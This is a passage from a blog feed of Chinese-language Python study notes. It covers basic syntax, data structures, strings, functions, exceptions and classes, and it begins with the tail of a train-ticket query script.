punctuation">,</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#正则表达式，[\u4e00-\u9fa5]代表全部的汉字</span>        <span class="token comment" spellcheck="true">#print(stationList)</span>    <span class="token comment" spellcheck="true">#返回的stationList是列表，需要转成字典</span>    nameDic<span class="token operator">=</span>dict<span class="token punctuation">(</span>stationList<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(nameDic)</span>    <span class="token comment" spellcheck="true">#进行键值呼唤</span>    anti_nameDic<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">#空字典，用于将key和value进行交换</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> nameDic<span class="token punctuation">:</span>        anti_nameDic<span class="token punctuation">[</span>nameDic<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span>item    <span class="token keyword">return</span> anti_nameDic<span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#得到车次信息</span>    lst<span class="token operator">=</span>parseJson<span class="token punctuation">(</span>sendRequset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>getStation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#筛选，去除无票车次</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>        <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'无'</span> <span class="token operator">and</span> item<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#getStation()</span>    start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyNote</title>
      <link href="/2022/03/10/pyNote/"/>
      <url>/2022/03/10/pyNote/</url>
      
        <content type="html"><![CDATA[<h3 id="1-变量"><a href="#1-变量" class="headerlink" title="1.变量"></a>1.变量</h3><ul><li><code>chr</code>与<code>ord</code>函数</li><li>变量实际是一个<strong>对象的引用</strong></li><li><code>print(r ' string ' )</code>中的<code>\</code>会完整输出</li><li>变量包括三个属性<code>id(内存地址),type,value</code></li><li>二进制前缀<code>0b</code>,八进制前缀<code>0o</code>,十六进制前缀<code>0x</code></li><li>转二进制函数<code>bin()</code>，结果是字符串类型</li><li>转八进制函数<code>oct()</code>，结果是字符串类型</li><li>转十六进制函数<code>hex()</code>，结果是字符串类型</li></ul><h3 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2.数据类型"></a>2.数据类型</h3><ul><li>三引号<code>'''</code>或<code>"""</code>字符串可以<strong>多行显示</strong>，也可用来进行注释</li><li><code>bool</code>类型可以化为整型</li><li>类型转换：<code>str(),int(),float()</code></li><li>一个变量的type属性可以变化：<code>a=int(a)</code></li></ul><h3 id="3-输入与运算符"><a href="#3-输入与运算符" class="headerlink" title="3.输入与运算符"></a>3.输入与运算符</h3><ul><li><p><code>present=input("提示语句")</code>，运行结果是<strong>string类型</strong></p></li><li><p>算术运算符</p><ul><li>除法运算<code>/</code>（结果是<code>float</code>类型），<strong>整除</strong>运算<code>//</code>（<em>一正一负向下取整数</em>）</li><li>取余运算<code>%</code></li><li>幂运算<code>**</code></li></ul></li><li><p>赋值运算符</p><ul><li><p>运算顺序从右到左</p></li><li><p>支持链式赋值<code>a=b=c=10</code>，三者<code>id</code>相同，即地址相同，亦即只创建了<strong>一个内存对象</strong></p></li><li><p>支持参数复制</p></li><li><p>支持系列解包复制</p></li><li><p><code>a,b,c=20,30,40</code>,创建了三个内存对象</p></li><li><p><code>a,b=b,a</code>,交换值</p></li></ul></li><li><p>比较运算符</p><ul><li>运算结果是<code>bool</code>类型</li><li><code>==</code>比较的是<code>value</code></li><li><code>is</code>与<code>is not</code>比较的是<code>id</code></li></ul></li><li><p>布尔运算符</p><ul><li><code>and,or,not,in,not in</code></li></ul></li><li><p>位运算符</p><ul><li><code>&amp;,|,&gt;&gt;,&lt;&lt;</code></li></ul></li><li><p>运算符的优先级</p><ul><li>算术运算符——位运算符——比较运算符——布尔运算符——赋值运算符</li><li>位运算符：&lt;&lt;,&gt;&gt;  &amp;  |</li><li>布尔运算符：and  or</li></ul></li></ul><h3 id="4-程序的组织结构"><a href="#4-程序的组织结构" class="headerlink" title="4.程序的组织结构"></a>4.程序的组织结构</h3><ul><li><p>顺序结构，选择结构，循环结构</p></li><li><p><strong>python一切皆对象</strong>，所有对象皆有一个布尔值</p><ul><li>获取对象的布尔值，使用内置函数<code>bool()</code></li><li>以下对象的布尔值为<code>false</code>，其他均为<code>true</code><ul><li>False</li><li>数值0</li><li>None</li><li>空字符串</li><li>空列表</li><li>空元组</li><li>空字典</li><li>空集合</li></ul></li></ul></li><li><p>选择结构</p><ul><li><code>if 条件表达式:</code></li><li>多分支<code>if-elif</code></li><li>条件表达式<code>90&lt;=num&lt;=100</code></li><li><code>print((num_a,'大于等于',num_b)  if num_a&gt;=num_b else  (num_a,'小于',num_b))</code><ul><li>如果是true则输出前面内容，是false则输出后面内容</li></ul></li><li><code>pass</code>什么都不做，只是一个占位符</li></ul></li><li><p>循环结构</p><ul><li>内置函数range<ul><li>用于生成一个整数序列<code>(range对象)</code>，迭代器</li><li>创建range对象三种方式<ol><li><code>range(stop)</code>创建一个<code>(0,stop)</code>之间的整数序列，步长为1</li><li><code>range(start,stop)</code></li><li><code>range(start,stop,step)</code></li><li><code>print(list(r))</code>用于查看range对象中的整数序列</li></ol></li><li>range对象的优点：只<strong>存储三个值</strong>，占用内存空间较少，只有当用到range对象时，才回去计算序列中的相关元素</li></ul></li><li><code>while</code>循环<ul><li><code>while 条件表达式:</code></li></ul></li><li><code>for-in</code>循环<ul><li><code>for i in 可迭代对象:</code></li><li>如果在循环体中不需要使用自定义变量，可将自定义变量写为<code>_</code></li></ul></li><li><code>else与for和while</code><ul><li><code>for与while</code>正常执行完毕退出后执行<code>else</code>语句，但当遇到<code>break</code>时，不执行<code>else</code>语句</li></ul></li></ul></li></ul><h3 id="5-列表"><a href="#5-列表" class="headerlink" title="5.列表"></a>5.列表</h3><ul><li><p>列表相当于其他语言中的数组，可对其中的数据进行整体操作</p></li><li><p><code>lst=['hello','world',98]</code></p></li><li><p>列表是n多个<strong>引用</strong>，存储的是<strong>对象的引用</strong>，即对象的<code>id</code>，上述列表的的三个引用指向列表对象</p></li><li><p>列表的创建：</p><ul><li>使用中括号<code>[]</code></li><li>使用内置函数<code>list([])</code></li></ul></li><li><p><img src="/2022/03/10/pyNote/image-20210615173908965.png"></p></li><li><p>列表的特点：</p><ul><li>列表元素按照顺序有序排列</li><li>索引映射唯一的一个元素</li><li>可以存储相同数据</li><li><strong>任意数据类型</strong></li><li>根据需要动态分配回收内存，不用担心多和不够用</li></ul></li><li><p>列表的操作</p><ul><li><p><code>lst.index()</code>,获取列表中元素的<strong>索引</strong></p><ul><li>如果有相同元素返回较小的索引</li><li><code>lst.index(element,a,b)</code>,在指定的**[a,b)**中查找元素的索引</li></ul></li><li><p>获取列表的多个元素——切片</p><ul><li><code>lst[a:b:c]</code>,切片是一个<strong>新的列表对象</strong>，从a开始到b结束，步长为c</li><li>步长为负数时，逆序输出，<code>start</code>从末尾开始，<code>stop</code>从开头开始</li></ul></li><li><p>判断指定元素在列表是否存在</p><ul><li><code>in与not in</code></li></ul></li><li><p>列表元素的<strong>增删改</strong></p><ul><li><p>——<strong>增加</strong></p></li><li><p><code>list.append()</code>在列表的末尾添加一个元素</p></li><li><p><code>lst.append(lst2)</code>是将<code>lst2</code>作为<strong>一个元素</strong>添加</p></li><li><p><code>lst.extend(lst2)</code>将<code>lst2</code>中的元素追加到<code>lst</code>中</p></li><li><p><code>lst.insert(a,b)</code>在a位置<strong>添加</strong>一个元素b</p></li><li><p><code>lst[a:]=lst2</code>将<code>lst[a:]</code>部分<strong>替换</strong>为<code>lst2</code></p></li><li><p>——<strong>删除</strong></p></li><li><p><code>lst.remove(elemrnt)</code>在列表中移除元素<code>element</code>,多个元素只移除<strong>一个</strong></p></li><li><p><code>lst.pop(index)</code>根据<strong>索引</strong>移除元素，若不指定索引则删除<strong>最后一个</strong>元素</p></li><li><p><code>lst[a:b]=[]</code>用空列表替代，<strong>删除多个</strong>元素</p></li><li><p><code>lst.clear()</code>清除列表中的所有元素</p></li><li><p><code>del lst</code>删除<code>lst</code></p></li><li><p>——<strong>修改</strong></p></li><li><p>通过索引修改</p></li><li><p><img src="/2022/03/10/pyNote/image-20210616105710293.png"></p></li><li><p><code>lst[a:]=lst2</code>将<code>lst[a:]</code>部分替换为<code>lst2</code></p></li></ul></li><li><p>列表的<strong>排序操作</strong></p><ul><li><p><code>lst.sort()</code>,升序排序</p><ul><li><p><code>list.sort(cmp=None,key=None,reverse=False)</code></p></li><li><p><code>cmp</code>可选参数，如果指定了该参数会使用该参数的方法进行排序</p></li><li><p><code>key</code>主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#获取列表的第二个元素</span><span class="token keyword">def</span> <span class="token function">takeSecond</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> elem<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#列表</span>random<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#指定第二个元素排序</span>random<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span>takeSecond<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出类别</span><span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">)</span></code></pre></li><li><p>上例中的<code>takeSecond()</code>常用<code>lambda</code>函数实现</p></li><li><pre class=" language-python"><code class="language-python">takeSecond <span class="token operator">=</span> <span class="token keyword">lambda</span> elem <span class="token punctuation">:</span> elem<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre></li></ul></li></ul></li><li><p><code>lst.sort(reverse=True)</code>,降序排序</p></li><li><p><code>lst.sorted()</code>,产生一个新的列表对象</p></li></ul></li><li><p>列表<strong>生成式</strong></p><ul><li>即生成列表的公式</li><li><code>lst=[f(i) for i in range(1,10)]</code>,则列表中的元素是<code>f(i)</code></li></ul></li></ul></li></ul><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><ul><li><p>字典是python内置的数据结构之一，与列表一样是一个<strong>可变序列</strong>，以<code>{}</code>表示，以<strong>键-值对</strong>方式存储数据</p></li><li><p>列表是一个<strong>有序</strong>的序列，字典是一个<strong>无序</strong>序列，位置由hash决定</p></li><li><p><img src="/2022/03/10/pyNote/image-20210616111226484.png"></p></li><li><p>放在字典中的<strong>键</strong>必须是<strong>不可变序列</strong>(如字符串,整数)，即不可进行增删改操作</p></li><li><p>字典的创建</p><ul><li><code>scores={'张三':100,'李四':80}</code></li><li>使用内置函数<code>dict()</code>,<code>stduent=dict('name'='jack','age'=20)</code></li></ul></li><li><p>字典中元素的获取</p><ul><li><p><strong>尽量使用<code>get</code>函数</strong></p></li><li><p><code>scores['张三']</code></p></li><li><p>使用内置函数<code>get()</code>,<code>scores.get('张三')</code></p></li><li><p>索引查找不存在时报错，<code>get()</code>函数查找不存在时返回none或默认值<code>scores.get('陈六'，00)</code>，其中<code>00</code>即是默认值</p></li></ul></li><li><p>字典的<strong>增删改</strong></p><ul><li>键的判断：<code>in或not in</code></li><li>键值对的<strong>删除</strong>：<code>del scores['张三']</code></li><li>字典的清空：<code>dict.clear()</code></li><li>键值对的<strong>添加或修改</strong>：<code>dict['陈六']=50</code></li></ul></li><li><p>获取字典的<strong>视图</strong></p><ul><li>获取字典中所有的<strong>key</strong>：<code>dict.key()</code></li><li>获取字典中所有的<strong>value</strong>：<code>dict.value()</code></li><li>获取字典中所有<strong>键值对</strong>：<code>dict.items()</code></li><li>上述函数返回的是<code>dict_key</code>,<code>dict_values</code>,<code>dict_items</code>类型，一般要进行<code>list()</code>转换</li></ul></li><li><p>字典元素的遍历</p><ul><li><code>for item in dict: print(item,dict[item])</code></li></ul></li><li><p>字典的总结_特点</p><ul><li>键不允许重复，否则会覆盖，值可以重复</li><li>字典中的元素是无序的</li><li>字典会浪费<strong>大量的内存</strong>，是用空间换时间</li></ul></li><li><p>字典<strong>生成式</strong></p><ul><li><img src="/2022/03/10/pyNote/image-20210616113751414.png"></li><li><img src="/2022/03/10/pyNote/image-20210616114021529.png"></li></ul></li></ul><h3 id="元组与集合"><a href="#元组与集合" class="headerlink" title="元组与集合"></a>元组与集合</h3><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><ul><li>元组是python内置的数据结构之一，属于<strong>不可变序列</strong>，其他与<code>list</code>类似</li><li>元组的创建方式<ul><li>使用<code>()</code>:<code>t=('python','world',98)</code></li><li>使用内置函数<code>tuple</code>:<code>t=tuple(('python','world',98))</code></li><li>元组只有一个元素时要加上<code>,</code></li></ul></li><li>元组设计成不可变序列的原因<ul><li>在多任务环境下，同时操作对象时不需要加锁</li><li><img src="/2022/03/10/pyNote/image-20210616115917434.png"></li></ul></li><li>元组的遍历<ul><li>使用索引获取</li><li>使用<code>for</code>循环遍历</li></ul></li></ul><h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><ul><li>集合是python语言提供的内置数据结构，输入<strong>可变类型序列</strong>，支持增删改操作</li><li>集合是没有value的字典，底层函数也使用了hash表，集合同样不允许重复，元素无序</li><li>集合的创建<ul><li><code>s={'a','b'}</code></li><li>内置函数<code>set()</code>：<code>set(range(6))</code></li><li>空集合：<code>s=set{}</code></li><li><img src="/2022/03/10/pyNote/image-20210616121405740.png"></li></ul></li><li>集合的相关操作<ul><li>判断存在：<code>in和not in</code></li><li>集合元素的<strong>新增</strong>操作<ul><li><code>s.add(element)</code>,添加元素<code>element</code></li><li><code>s.update()</code>,括号中可以放一个<strong>集合，列表，元组</strong></li></ul></li><li>集合元素的<strong>删除</strong>操作<ul><li><code>s.remove(element)</code>,删除元素<code>element</code>，元素不存在会抛异常</li><li><code>s.descard(element)</code>,删除元素<code>element</code>，元素不存在不会抛异常</li><li><code>s.pop()</code>,任意删除一个元素</li><li><code>s.clear()</code>,清除所有元素</li></ul></li><li>集合之间的关系<ul><li>判断集合相等：<code>==</code>&amp;<code>！=</code></li><li>判断子集：<code>s.issubset(s2)</code>，判断<code>s</code>是否是<code>s2</code>的子集</li><li>判断超集：<code>s.issuperset(s2)</code></li><li>判断交集：<code>s.isdisjoint(s2)</code></li></ul></li><li>集合的数据操作<ul><li>交集：<code>s1.intersection(s2)</code>,或<code>s1 &amp; s2</code></li><li>并集：<code>s1.union(s2)</code>,或<code>s1 | s2</code></li><li>差集：<code>s1.difference(s2)</code>,或<code>s1-s2</code></li><li>对称差集：<code>s1.symmetric_difference(s2)</code>,或<code>s1^ s2</code></li></ul></li></ul></li><li>集合生成式<ul><li><code>set={f(i) for i in range(num)}</code>,类似于列表生成式</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/03/10/pyNote/image-20210617165619295.png"></p><h3 id="6-字符串"><a href="#6-字符串" class="headerlink" title="6.字符串"></a>6.字符串</h3><ul><li>字符串是python中的基本数据类型，是一个<strong>不可变序列</strong></li><li>字符串<strong>驻留机制</strong><ul><li>仅保存一份相同且不可变字符串的方法，不同的值被保存在字符串的贮留池中，python的驻留机制对<strong>相同的字符串</strong>只<strong>保留一份拷贝</strong>，后续创建相同字符串时，不会开辟新的空间，而是把该字符串的地址赋给新创建的变量</li><li>驻留机制的几种情况(交互模式)</li><li><code>pycharm</code>对字符串优化处理</li></ul></li><li>字符串的<strong>查询操作</strong><ul><li><img src="/2022/03/10/pyNote/image-20210617171751958.png"></li><li>尽量使用<code>find</code>方法</li></ul></li><li>字符串的<strong>大小写转换</strong><ul><li><img src="/2022/03/10/pyNote/image-20210617172220145.png"></li><li>转换会产生一个<strong>新的字符串对象</strong></li></ul></li><li>字符串的<strong>内容对齐操作</strong><ul><li><img src="/2022/03/10/pyNote/image-20210617172644369.png"></li></ul></li><li>字符串的<strong>分割操作</strong><ul><li><img src="/2022/03/10/pyNote/image-20210617173118651.png"></li></ul></li><li>字符串的<strong>判断操作</strong><ul><li><img src="/2022/03/10/pyNote/image-20210617173648887.png"></li></ul></li><li>字符串的<strong>替换与合并</strong><ul><li><img src="/2022/03/10/pyNote/image-20210617174149550.png"></li><li><code>pritn('x'.join(lst))</code>,x是字符串的连接符</li><li><code>print('*'.join('python'))</code>的结果是<code>p*y*t*h*o*n</code></li></ul></li><li>字符串的<strong>比较操作</strong><ul><li>运算符<code>&gt;,&gt;=,&lt;,&lt;=,==,!=</code></li><li>比较规则：有限比较两个字符串的第一个字符，如果相等则继续比较下一个字符，依次比较下去，知道两个字符串中的字符不相等时，其比较结果就是两个字符串的比较结果，两个字符串中的所有后续字符将不再被比较</li></ul></li><li>字符串的<strong>切片操作</strong><ul><li>切片后产生<strong>新的对象</strong></li><li><img src="/2022/03/10/pyNote/image-20210617175552171.png"></li><li>完整写法<code>s[statr:stop:step]</code></li><li>与列表的切片类似</li><li>当<code>step</code>是负数时会反序输出</li></ul></li><li><strong>格式化字符串</strong>(print)<ul><li>原因：字符串中有些东西可变，有些东西不可变</li><li><img src="/2022/03/10/pyNote/image-20210617180619431.png"></li><li><img src="/2022/03/10/pyNote/image-20210617180632017.png"></li><li><strong><code>format</code>字符串格式化，可以把<code>format</code>中的内容，放入到字符串指定位置</strong></li><li>第一种方式的精度与宽度设置类似于C语言</li><li>第二种：<img src="/2022/03/10/pyNote/image-20210617181113530.png"></li></ul></li><li>字符串的<strong>编码转换</strong><ul><li>编码：将字符串 转换为二进制数据(<code>bytes</code>)</li><li>解码：将<code>bytes</code>类型的数据转换成字符串类型</li><li>编码：<code>s.encode(encoding='GBK/UTF-8')</code></li><li>解码：<code>byte.decode(encoding='GBK/UTF-8')</code>,<code>byte</code>是编码出的二进制数据</li></ul></li><li>总结<ul><li><img src="/2022/03/10/pyNote/image-20210617182031869.png"></li></ul></li></ul><h3 id="7-函数"><a href="#7-函数" class="headerlink" title="7.函数"></a>7.函数</h3><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> 函数名<span class="token punctuation">(</span><span class="token punctuation">[</span>输入参数<span class="token punctuation">]</span><span class="token punctuation">)</span>    函数体    <span class="token punctuation">[</span><span class="token keyword">return</span> xxx<span class="token punctuation">]</span></code></pre></li><li><p>输入参数可以通过<code>形参=实参</code>进行指定</p></li><li><p><strong>可变类型变量</strong>和<strong>不可变类型变量</strong>传入函数后，前者可直接对实参修改，后者不可对实参修改</p></li><li><p>函数返回<strong>多个值</strong>时，结果是<strong>元组</strong></p></li><li><p>函数定义时，给<strong>形参设置默认值</strong>，只有与默认值不符的时候才需要传递</p></li><li><p>定义参数时，可能无法事先确定传递的位置实参的个数</p><ul><li>使用可变的<strong>位置参数</strong>，使用<code>*</code>定义个数可变的位置形参，结果为一个<strong>元组</strong>，只能定义一个</li><li><img src="/2022/03/10/pyNote/image-20210620112447503.png"></li><li>使用可变的<strong>关键字形参</strong>，使用<code>**</code>定义个数可变的关键字传参，结果为一个<strong>字典</strong>，只能定义一个</li><li><img src="/2022/03/10/pyNote/image-20210620112506753.png"></li><li>两者均出现时，要先写位置参数，再写关键字形参</li><li><img src="/2022/03/10/pyNote/image-20210620113357045.png"></li><li><code>def fun(a,b,*,c,d)</code>在<code>*</code>之后只能采用关键字传参</li></ul></li><li><p>函数参数总结</p><ul><li><img src="/2022/03/10/pyNote/image-20210620113432195.png"></li></ul></li></ul><h3 id="8-Bug"><a href="#8-Bug" class="headerlink" title="8.Bug"></a>8.<code>Bug</code></h3><ul><li><p>如果没有异常处理机制，则<code>bug</code>由<code>python</code>自己捕获，如果有异常处理机制，则<code>bug</code>由处理机制捕获</p></li><li><p><code>python</code> 的异常处理机制<code>try-except</code></p><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>可能出现异常的代码    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">except</span> xxx<span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">except</span> yyy<span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre></li><li><p><code>xxx</code>是捕获的异常</p></li><li><p><img src="/2022/03/10/pyNote/image-20210620120525852.png"></p></li></ul></li><li><p><code>python</code>异常处理机制<code>try-except-else</code></p><ul><li>如果<code>try</code>块中没有抛出异常，则执行<code>else</code>块，如果<code>try</code>中抛出异常，则执行<code>except</code>块</li><li><img src="/2022/03/10/pyNote/image-20210620120939095.png"></li></ul></li><li><p><code>python</code>异常处理机制<code>try-except-else-finally</code></p><ul><li><code>finally</code>块无论是否发生异常都会被执行，常用来释放<code>try</code>块中申请的资源</li><li><img src="/2022/03/10/pyNote/image-20210620121109546.png"></li></ul></li><li><p><code>python</code>的常见的<strong>异常类型</strong></p><ul><li><img src="/2022/03/10/pyNote/image-20210620121253682.png"></li></ul></li><li><p><code>traceback</code>模块</p><ul><li>使用<code>traceback</code>模块打印异常信息</li></ul></li><li><p><code>raise</code>手动抛出异常</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    score<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">'请输入分数'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;=</span>score<span class="token operator">&lt;=</span><span class="token number">100</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'分数为'</span><span class="token punctuation">,</span>score<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'分数不正确'</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span></code></pre></li></ul></li></ul><h3 id="9-类与对象"><a href="#9-类与对象" class="headerlink" title="9.类与对象"></a>9.类与对象</h3><ul><li><p>类的创建</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">:</span><span class="token punctuation">(</span>首字母大写<span class="token punctuation">)</span>    <span class="token keyword">pass</span></code></pre></li></ul></li><li><p>类的<strong>组成</strong></p><ul><li>类属性</li><li>实例属性</li><li>实例方法</li><li>静态方法<code>@staticmethod</code></li><li>类方法<code>@classmethod</code></li><li><img src="/2022/03/10/pyNote/image-20210621160622538.png"></li><li><code>def</code>在类之内定义的称为方法，在类之外的称为函数</li></ul></li><li><p>对象(实例)的创建</p><ul><li><code>实例名=类名()</code></li><li><img src="/2022/03/10/pyNote/image-20210621161935674.png"></li><li><img src="/2022/03/10/pyNote/image-20210621161952532.png"></li></ul></li><li><p>类属性，类方法与静态方法</p><ul><li><p><code>dir()</code>内置函数查看<strong>类对象</strong>的<strong>属性和方法</strong></p></li><li><p>类属性</p><ul><li><p>对应于实例属性</p></li><li><p>类属性存储在<strong>类对象</strong>中，如果改变则所有实例对象的类属性都会同时更改，即<strong>被该类的所有对象所共享</strong></p></li><li><p>实例对象通过<strong>类指针</strong>访问类属性</p></li></ul></li><li><p>类方法</p><ul><li>对应于实例方法</li><li>使用类名直接访问</li></ul></li><li><p>静态方法</p><ul><li>使用类名直接访问</li></ul></li></ul></li><li><p><strong>动态绑定属性和方法</strong></p><ul><li><p><code>python</code>语言是动态语言，在创建对象后，可以动态的绑定属性和方法</p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我是一函数'</span><span class="token punctuation">)</span>    stu<span class="token operator">=</span>Student<span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>stu<span class="token punctuation">.</span>gender<span class="token operator">=</span><span class="token string">'男'</span> <span class="token comment" spellcheck="true"># 动态绑定性别</span><span class="token keyword">print</span><span class="token punctuation">(</span>stu<span class="token punctuation">.</span>name<span class="token punctuation">,</span>stu<span class="token punctuation">.</span>age<span class="token punctuation">,</span>stu<span class="token punctuation">.</span>gender<span class="token punctuation">)</span>stu<span class="token punctuation">.</span>show<span class="token operator">=</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 动态绑定方法</span>stu<span class="token punctuation">.</span>show</code></pre></li></ul></li></ul><h3 id="10-面向对象"><a href="#10-面向对象" class="headerlink" title="10.面向对象"></a>10.面向对象</h3><ul><li><p>面向对象的三大特征</p><ul><li><p><strong>封装</strong>：提高程序的安全性</p><ul><li><p>将数据(属性)和行为(方法)包装到类对象中。在方法内部对属性进行操作，在类对象的外部调用方法。这样，无需关心方法内部的具体实现细节，从而隔离了复杂度</p></li><li><p>在<code>python</code>中没有专门的修饰符用于属性的私有，如果该属性不希望在类对象外部被访问，前边使用两个<code>_</code></p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name<span class="token operator">=</span>name        self<span class="token punctuation">.</span>__age<span class="token operator">=</span>age <span class="token comment" spellcheck="true"># 年龄不希望在类的外部被直接使用</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>__age<span class="token punctuation">)</span></code></pre></li><li><p>强迫访问<code>print(stu._Student__age)</code></p></li></ul></li><li><p><strong>继承</strong>：提高代码的复用性</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> 子类类名<span class="token punctuation">(</span>父类<span class="token number">1</span>，父类<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre></li><li><p>如何一个类没有继承任何类，则默认继承<code>object</code></p></li><li><p><code>python</code>支持多继承</p></li><li><p>定义子类时，必须在其<strong>构造函数</strong>中调用父类的构造函数</p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name<span class="token operator">=</span>name        self<span class="token punctuation">.</span>age<span class="token operator">=</span>age    <span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'姓名:{0},年龄:{1}'</span><span class="token punctuation">,</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义子类</span><span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">(</span>Person<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>score<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span 